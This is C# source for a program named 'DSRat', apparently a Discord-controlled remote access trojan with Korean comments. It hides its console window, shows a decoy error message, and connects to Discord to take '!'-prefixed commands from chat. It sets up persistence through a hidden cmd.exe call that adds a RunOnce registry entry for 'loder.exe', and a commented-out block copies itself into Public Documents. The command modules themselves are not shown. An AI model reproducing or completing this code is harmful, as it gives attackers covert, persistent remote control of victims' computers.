using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Win32;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace DSRat
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]   
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // 숨기기
        CommandService commands;
        DiscordSocketClient client;

        static void Main(string[] args)
        {
            Process[] procs = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
            if (procs.Length > 1)
            {
                MessageBox.Show("An error occurred", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            else
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
                new Program().BotMain().GetAwaiter().GetResult();
                /*string publicDir = Environment.GetEnvironmentVariable("public");
                string copyPath = publicDir + @"\Documents\<Filename>";
                FileInfo copyFile = new FileInfo(copyPath);
                string OriginPath = Assembly.GetEntryAssembly().Location;
                if (!(copyFile.Exists))
                {
                    System.IO.File.Copy(OriginPath, copyPath);
                }
                MakeThisAppAutoRunOnStartUp();*/
            }
        }
        public static void MakeThisAppAutoRunOnStartUp()
        {
            string publicDir = Environment.GetEnvironmentVariable("public");
            System.Diagnostics.ProcessStartInfo pro = new ProcessStartInfo();
            System.Diagnostics.Process pri = new Process();
            pro.FileName = "cmd.exe";
            pro.CreateNoWindow = true;
            pro.UseShellExecute = false;
            pro.RedirectStandardInput = true;
            pro.RedirectStandardOutput = false;
            pro.RedirectStandardError = false;
            pri.StartInfo = pro;
            pri.Start();
            pri.StandardInput.Write("reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"" + "Startup" + "\" /t REG_SZ /d " + publicDir + @"\Documents\" + "loder.exe" + " /f");
            Thread.Sleep(3000);
            pri.StandardInput.Write(Environment.NewLine);
            pri.StandardInput.Close();
            pri.WaitForExit();
            pri.Close();
        }
        public async Task BotMain()
        {
            commands = new CommandService(new CommandServiceConfig()
            {
                LogLevel = LogSeverity.Verbose
            });
            client = new DiscordSocketClient(new DiscordSocketConfig()
            {
                LogLevel = LogSeverity.Verbose
            });


            await client.LoginAsync(TokenType.Bot, "Token Here"); //봇의 토큰을 사용해 서버에 로그인
            await client.StartAsync();                         //봇이 이벤트를 수신하기 시작

            client.MessageReceived += OnClientMessage;         //봇이 메시지를 수신할 때 처리하도록 설정

              await commands.AddModulesAsync(assembly: Assembly.GetEntryAssembly(), services: null);  //봇에 명령어 모듈 등록

            await Task.Delay(-1);
        }
        private async Task OnClientMessage(SocketMessage arg)
        {

            //수신한 메시지가 사용자가 보낸 게 아닐 때 취소
            var sdanjaksdnjk137419283NASDKJNADKSKJ = arg as SocketUserMessage;
            if (sdanjaksdnjk137419283NASDKJNADKSKJ == null) return;

            int pos = 0;

            //메시지 앞에 !이 달려있지 않고, 자신이 호출된게 아니거나 다른 봇이 호출했다면 취소
            if (!(sdanjaksdnjk137419283NASDKJNADKSKJ.HasCharPrefix('!', ref pos) ||
             sdanjaksdnjk137419283NASDKJNADKSKJ.HasMentionPrefix(client.CurrentUser, ref pos)) ||
              sdanjaksdnjk137419283NASDKJNADKSKJ.Author.IsBot)
                return;

            var context = new SocketCommandContext(client, sdanjaksdnjk137419283NASDKJNADKSKJ);                    

            var result = await commands.ExecuteAsync(
                    context: context,
                    argPos: pos,
                    services: null);
        }

    }
}
